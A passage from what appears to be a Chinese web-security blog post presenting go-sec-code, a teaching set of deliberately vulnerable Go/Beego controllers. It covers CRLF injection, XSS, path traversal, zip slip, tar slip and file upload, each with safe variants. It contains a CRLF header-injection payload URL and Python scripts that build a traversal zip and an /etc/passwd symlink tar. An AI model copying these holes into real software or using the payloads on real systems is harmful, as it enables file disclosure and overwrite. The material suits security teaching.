<h1 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://127.0.0.1:233/crlfInjection/safe?header=%0aSet-cookie:JSPSESSID%3Dwooyun</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *CRLFSafe1Controller)</span></span> Get() &#123;</span><br><span class="line">	header := c.GetString(<span class="string">&quot;header&quot;</span>)</span><br><span class="line">	c.Ctx.ResponseWriter.Header().Set(<span class="string">&quot;header&quot;</span>, header)</span><br><span class="line">	c.Ctx.ResponseWriter.Write([]<span class="type">byte</span>(<span class="string">&quot;&quot;</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>(“Content-Type”, “text&#x2F;html”)</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *XSSVuln1Controller)</span></span> Get() &#123;</span><br><span class="line">	xss := c.GetString(<span class="string">&quot;xss&quot;</span>, <span class="string">&quot;hello&quot;</span>)</span><br><span class="line">	c.Ctx.ResponseWriter.Header().Set(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/html&quot;</span>)</span><br><span class="line">	c.Ctx.ResponseWriter.Write([]<span class="type">byte</span>(xss))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *XSSVuln2Controller)</span></span> Get() &#123;</span><br><span class="line">	xss := c.GetSession(<span class="string">&quot;xss&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> xss == <span class="literal">nil</span> &#123;</span><br><span class="line">		xss = <span class="string">&quot;hello&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	c.Data[<span class="string">&quot;xss&quot;</span>] = template.HTML(xss.(<span class="type">string</span>))</span><br><span class="line">	c.TplName = <span class="string">&quot;xss.tpl&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *XSSVuln3Controller)</span></span> Get() &#123;</span><br><span class="line">	file, err := ioutil.ReadFile(<span class="string">&quot;static/xss/poc.svg&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	c.Ctx.ResponseWriter.Write(file)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *XSSVuln4Controller)</span></span> Get() &#123;</span><br><span class="line">	file, err := ioutil.ReadFile(<span class="string">&quot;static/xss/poc.pdf&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	c.Ctx.ResponseWriter.Header().Set(<span class="string">&quot;Content-Security-Policy&quot;</span>, <span class="string">`default-src &#x27;self&#x27;;`</span>)</span><br><span class="line">	c.Ctx.ResponseWriter.Write(file)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *XSSVuln2Controller)</span></span> Post() &#123;</span><br><span class="line">	xss := c.GetString(<span class="string">&quot;xss&quot;</span>, <span class="string">&quot;hello&quot;</span>)</span><br><span class="line">	c.SetSession(<span class="string">&quot;xss&quot;</span>, xss)</span><br><span class="line">	c.Data[<span class="string">&quot;xss&quot;</span>] = template.HTML(xss)</span><br><span class="line">	c.TplName = <span class="string">&quot;xss.tpl&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *XSSSafe1Controller)</span></span> Get() &#123;</span><br><span class="line">	xss := c.GetString(<span class="string">&quot;xss&quot;</span>, <span class="string">&quot;hello&quot;</span>)</span><br><span class="line">	xssFilter := utils.XSSFilter&#123;&#125;</span><br><span class="line">	xss = xssFilter.DoFilter(xss)</span><br><span class="line">	c.Ctx.ResponseWriter.Header().Set(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/html&quot;</span>)</span><br><span class="line">	c.Ctx.ResponseWriter.Write([]<span class="type">byte</span>(xss))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *XSSSafe2Controller)</span></span> Get() &#123;</span><br><span class="line">	file, err := ioutil.ReadFile(<span class="string">&quot;static/xss/poc.svg&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	c.Ctx.ResponseWriter.Header().Set(<span class="string">&quot;Content-Security-Policy&quot;</span>, <span class="string">`default-src &#x27;self&#x27;;`</span>)</span><br><span class="line">	c.Ctx.ResponseWriter.Write(file)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h1><h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> controllers</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;go-sec-code/utils&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;path/filepath&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line"></span><br><span class="line">	beego <span class="string">&quot;github.com/beego/beego/v2/server/web&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *PathTraversalVuln1Controller)</span></span> Get() &#123;</span><br><span class="line">	file := c.GetString(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">	output, err := ioutil.ReadFile(file)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	c.Ctx.ResponseWriter.Write(output)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *PathTraversalVuln2Controller)</span></span> Get() &#123;</span><br><span class="line">	file := c.GetString(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">	file = filepath.Clean(file)</span><br><span class="line">	output, err := ioutil.ReadFile(file)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	c.Ctx.ResponseWriter.Write(output)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *PathTraversalVuln3Controller)</span></span> Get() &#123;</span><br><span class="line">	filePath := c.GetString(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">	filePath = filepath.Clean(filePath)</span><br><span class="line">	filePath = filepath.Join(<span class="string">&quot;./&quot;</span>, filePath)</span><br><span class="line">	openFile, err := os.Open(filePath)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.Ctx.ResponseWriter.Write([]<span class="type">byte</span>(<span class="string">&quot;error&quot;</span>))</span><br><span class="line">	&#125;</span><br><span class="line">	b := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">10000</span>)</span><br><span class="line">	_, err = openFile.Read(b)</span><br><span class="line">	_, err = c.Ctx.ResponseWriter.Write(b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *PathTraversalSafe1Controller)</span></span> Get() &#123;</span><br><span class="line">	file := c.GetString(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">	pathTraversalFilter := utils.PathTraversalFilter&#123;&#125;</span><br><span class="line">	<span class="keyword">if</span> pathTraversalFilter.DoFilter(file) &#123;</span><br><span class="line">		c.Ctx.ResponseWriter.Write([]<span class="type">byte</span>(<span class="string">&quot;evil input&quot;</span>))</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		output, err := ioutil.ReadFile(<span class="string">&quot;static/&quot;</span> + file)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="built_in">panic</span>(err)</span><br><span class="line">		&#125;</span><br><span class="line">		c.Ctx.ResponseWriter.Write(output)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *PathTraversalSafe2Controller)</span></span> Get() &#123;</span><br><span class="line">	file := c.GetString(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">	file = filepath.Join(<span class="string">&quot;static/&quot;</span>, file)</span><br><span class="line">	<span class="keyword">if</span> !strings.HasPrefix(file, <span class="string">&quot;static/&quot;</span>) &#123;</span><br><span class="line">		c.Ctx.ResponseWriter.Write([]<span class="type">byte</span>(<span class="string">&quot;evil input&quot;</span>))</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		output, err := ioutil.ReadFile(file)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="built_in">panic</span>(err)</span><br><span class="line">		&#125;</span><br><span class="line">		c.Ctx.ResponseWriter.Write(output)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="zipslip"><a href="#zipslip" class="headerlink" title="zipslip"></a>zipslip</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    try:</span><br><span class="line">        zipFile = zipfile.ZipFile(<span class="string">&quot;poc.zip&quot;</span>, <span class="string">&quot;a&quot;</span>, zipfile.ZIP_DEFLATED)</span><br><span class="line">        info = zipfile.ZipInfo(<span class="string">&quot;poc.zip&quot;</span>)</span><br><span class="line">        zipFile.write(<span class="string">&quot;/Users/topsry/Desktop/codeql/test/qaq.txt&quot;</span>, <span class="string">&quot;../../../../../../../../../tmp/qaq1.txt&quot;</span>, zipfile.ZIP_DEFLATED)</span><br><span class="line">        zipFile.<span class="built_in">close</span>()</span><br><span class="line">    except IOError as e:</span><br><span class="line">        raise e</span><br></pre></td></tr></table></figure>



<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *ZipSlipVuln1Controller)</span></span> Post() &#123;</span><br><span class="line">	_, h, err := c.GetFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//timestamp := fmt.Sprint(time.Now().Unix())</span></span><br><span class="line">	savePath := <span class="string">&quot;static/upload/&quot;</span> + h.Filename</span><br><span class="line">	c.SaveToFile(<span class="string">&quot;file&quot;</span>, savePath)</span><br><span class="line">	unzipPath := <span class="string">&quot;static/unzip/&quot;</span> + h.Filename</span><br><span class="line">	r, err := zip.OpenReader(savePath)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> _, f := <span class="keyword">range</span> r.File &#123;</span><br><span class="line">		fpath := filepath.Join(unzipPath, f.Name)</span><br><span class="line">		<span class="keyword">if</span> f.FileInfo().IsDir() &#123;</span><br><span class="line">			<span class="comment">// Make Folder</span></span><br><span class="line">			os.MkdirAll(fpath, os.ModePerm)</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Make File</span></span><br><span class="line">		<span class="keyword">if</span> err = os.MkdirAll(filepath.Dir(fpath), os.ModePerm); err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="built_in">panic</span>(err)</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		outFile, err := os.OpenFile(fpath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="built_in">panic</span>(err)</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		rc, err := f.Open()</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="built_in">panic</span>(err)</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		_, err = io.Copy(outFile, rc)</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Close the file without defer to close before next iteration of loop</span></span><br><span class="line">		outFile.Close()</span><br><span class="line">		rc.Close()</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="built_in">panic</span>(err)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	c.Data[<span class="string">&quot;savePath&quot;</span>] = unzipPath</span><br><span class="line">	c.TplName = <span class="string">&quot;fileUpload.tpl&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="tarslip"><a href="#tarslip" class="headerlink" title="tarslip"></a>tarslip</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    try:</span><br><span class="line">        # Create a tar archive file</span><br><span class="line">        with tarfile.open(<span class="string">&quot;malicious.tar&quot;</span>, <span class="string">&quot;w&quot;</span>) as tar:</span><br><span class="line">            # Add the symlink file to the tar archive</span><br><span class="line">            malicious_file = <span class="string">&quot;/tmp/evil_symlink&quot;</span></span><br><span class="line">            target_file = <span class="string">&quot;/etc/passwd&quot;</span>  # Target file <span class="keyword">for</span> the symlink</span><br><span class="line">            os.symlink(target_file, malicious_file)  # Create the symlink</span><br><span class="line">            tar.add(malicious_file, arcname=<span class="string">&quot;malicious_link&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            # Add other harmless files to the archive</span><br><span class="line">            harmless_file1 = <span class="string">&quot;/path/to/harmless_file1.txt&quot;</span></span><br><span class="line">            harmless_file2 = <span class="string">&quot;/path/to/harmless_file2.txt&quot;</span></span><br><span class="line">            tar.add(harmless_file1, arcname=<span class="string">&quot;harmless_file1.txt&quot;</span>)</span><br><span class="line">            tar.add(harmless_file2, arcname=<span class="string">&quot;harmless_file2.txt&quot;</span>)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        raise e</span><br></pre></td></tr></table></figure>





<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *TarSlipVuln1Controller)</span></span> Post() &#123;</span><br><span class="line">	_, h, err := c.GetFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	savePath := <span class="string">&quot;static/upload/&quot;</span> + h.Filename</span><br><span class="line">	c.SaveToFile(<span class="string">&quot;file&quot;</span>, savePath)</span><br><span class="line">	untarPath := <span class="string">&quot;static/untar/&quot;</span> + h.Filename</span><br><span class="line">	err = DeCompressTar(savePath, <span class="string">&quot;static/untar/&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//c.Data[&quot;savePath&quot;] = untarPath</span></span><br><span class="line">	<span class="comment">//c.TplName = &quot;fileUpload.tpl&quot;</span></span><br><span class="line">	<span class="comment">//file, err := os.Open(savePath)</span></span><br><span class="line">	<span class="comment">//defer file.Close()</span></span><br><span class="line">	<span class="comment">//tarReader := tar.NewReader(file)</span></span><br><span class="line">	<span class="comment">//header, _ := tarReader.Next()</span></span><br><span class="line">	<span class="comment">//os.MkdirAll(path.Dir(header.Name), 0755) // NOT OK</span></span><br><span class="line">	c.Data[<span class="string">&quot;savePath&quot;</span>] = untarPath</span><br><span class="line">	c.TplName = <span class="string">&quot;fileUpload.tpl&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> controllers</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;go-sec-code/utils&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line">	beego <span class="string">&quot;github.com/beego/beego/v2/server/web&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> FileUploadVuln1Controller <span class="keyword">struct</span> &#123;</span><br><span class="line">	beego.Controller</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> FileUploadSafe1Controller <span class="keyword">struct</span> &#123;</span><br><span class="line">	beego.Controller</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *FileUploadVuln1Controller)</span></span> Get() &#123;</span><br><span class="line">	c.TplName = <span class="string">&quot;fileUpload.tpl&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *FileUploadVuln1Controller)</span></span> Post() &#123;</span><br><span class="line">	userid := c.GetString(<span class="string">&quot;userid&quot;</span>)</span><br><span class="line">	_, h, err := c.GetFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	savePath := <span class="string">&quot;static/upload/&quot;</span> + userid + fmt.Sprint(time.Now().Unix()) + h.Filename</span><br><span class="line">	c.SaveToFile(<span class="string">&quot;file&quot;</span>, savePath)</span><br><span class="line">	c.Data[<span class="string">&quot;savePath&quot;</span>] = savePath</span><br><span class="line">	c.TplName = <span class="string">&quot;fileUpload.tpl&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *FileUploadSafe1Controller)</span></span> Get() &#123;</span><br><span class="line">	c.TplName = <span class="string">&quot;fileUpload.tpl&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *FileUploadSafe1Controller)</span></span> Post() &#123;</span><br><span class="line">	userid := c.GetString(<span class="string">&quot;userid&quot;</span>)</span><br><span class="line">	fileUploadFilter := utils.FileUploadFilter&#123;&#125;</span><br><span class="line">	evil := fileUploadFilter.DoFilter(userid)</span><br><span class="line">	<span class="keyword">if</span> evil == <span class="literal">true</span> &#123;</span><br><span class="line">		c.Ctx.ResponseWriter.Write([]<span class="type">byte</span>(<span class="string">&quot;evil input&quot;</span>))</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	_, h, err := c.GetFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	savePath := <span class="string">&quot;static/upload/&quot;</span> + userid + fmt.Sprint(time.Now().Unix()) + h.Filename</span><br><span class="line">	c.SaveToFile(<span class="string">&quot;file&quot;</span>, savePath)</span><br><span class="line">	c.Data[<span class="string">&quot;savePath&quot;</span>] = savePath</span><br><span class="line">	c.TplName = <span class="string">&quot;fileUpload.tpl&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
    </div>

    
    
    

    <footer class="post-footer">
          <div class="followme">
  <span>欢迎关注我的其它发布渠道</span>

  <div class="social-list">

      <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag"># web安全</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2022/09/12/ssrf/" rel="prev" title="SSRF入门">
                  <i class="fa fa-angle-left"></i> SSRF入门
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2024/02/20/%E4%BD%BF%E7%94%A8llm%E6%9D%A5%E8%BE%85%E5%8A%A9%E9%9D%99%E6%80%81%E6%89%AB%E6%8F%8F%E7%9A%84%E4%BA%BA%E5%B7%A5%E5%AE%A1%E8%AE%A1/" rel="next" title="使用llm来辅助静态扫描的人工审计">
                  使用llm来辅助静态扫描的人工审计 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Lya0</span>
  </div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
